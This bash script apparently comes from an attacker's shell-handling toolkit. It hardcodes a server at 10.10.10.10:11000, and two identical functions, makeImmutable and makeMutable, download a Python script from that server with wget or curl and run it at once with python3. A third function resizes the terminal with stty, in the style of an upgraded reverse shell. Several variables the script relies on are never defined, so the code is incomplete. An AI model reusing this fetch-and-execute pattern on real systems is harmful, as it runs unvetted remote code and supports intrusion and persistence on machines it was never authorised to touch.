#!/bin/bash

TERMINAL_ROWS=""
TERMINAL_COLUMNS=""
SERVER_HOST="10.10.10.10"
SERVER_PORT="11000"

function terminalSync () {
    stty rows $TERMINAL_ROWS columns $TERMINAL_COLUMNS
}

function makeImmutable () {
    filename=$(mktemp)
    if [[ "$HAS_WGET" != "$FALSE" ]];
    then
	    wget "http://$SERVER_HOST:$SERVER_PORT/preload/scripts/py/pattr.py" -O "$filename"
    elif [[ "$HAS_CURL" != "$FALSE" ]];
	then
	    curl --silent "http://$SERVER_HOST:$SERVER_PORT/preload/scripts/py/pattr.py" -o "$filename"
   fi
    python3 "$filename" "$1"
}

function makeMutable () {
	filename=$(mktemp)
    if [[ "$HAS_WGET" != "$FALSE" ]];
    then
	    wget "http://$SERVER_HOST:$SERVER_PORT/preload/scripts/py/pattr.py" -O "$filename"
    elif [[ "$HAS_CURL" != "$FALSE" ]];
	then
	    curl --silent "http://$SERVER_HOST:$SERVER_PORT/preload/scripts/py/pattr.py" -o "$filename"
   fi
    python3 "$filename" "$1"
} 